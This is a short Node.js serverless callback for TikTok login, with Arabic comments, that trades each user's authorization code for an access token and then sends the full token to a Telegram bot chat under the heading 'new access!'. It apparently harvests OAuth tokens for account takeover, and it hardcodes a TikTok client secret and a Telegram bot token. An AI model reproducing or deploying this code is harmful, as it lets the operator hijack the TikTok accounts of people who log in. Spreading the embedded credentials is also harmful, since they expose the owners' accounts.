const https = require('https');

// ضع مفاتيحك هنا بعد استبدالها
const CLIENT_KEY = 'sbawsudq1bxhkm3b3y';
const CLIENT_SECRET = 'hddQpiSl5FTstFFjEYxifCWvNdvifUXa';
const TELEGRAM_TOKEN = '8764995786:AAH6TdLNgNP7n13JKr7M8GSFlgW3Sr87dXE';
const TELEGRAM_CHAT_ID = '7644255708';

module.exports = async (req, res) => {
  const urlParams = new URLSearchParams(req.url.split('?')[1]);
  const code = urlParams.get('code');

  if (!code) return res.end('Waiting for TikTok Login...');

  // 1. تبادل الكود بالتوكين
  const tokenReq = https.request({
    hostname: 'open.tiktokapis.com',
    path: '/v2/oauth/token/',
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
  }, (response) => {
    let data = '';
    response.on('data', (c) => data += c);
    response.on('end', async () => {
      const tokenJson = JSON.parse(data);
      
      // 2. إرسال النتيجة إلى تليجرام
      const msg = `🚀 وصول جديد!\n\n🔑 التوكين:\n${JSON.stringify(tokenJson)}`;
      https.get(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`);
      
      res.setHeader('Content-Type', 'application/json');
      res.end(JSON.stringify({ status: "Auth Success", token: tokenJson }));
    });
  });

  tokenReq.write(`client_key=${CLIENT_KEY}&client_secret=${CLIENT_SECRET}&code=${code}&grant_type=authorization_code&redirect_uri=https://my-tiktok-auth-lzkjg04nh-anadkkkkkkkks-projects.vercel.app/api/callback`);
  tokenReq.end();
};
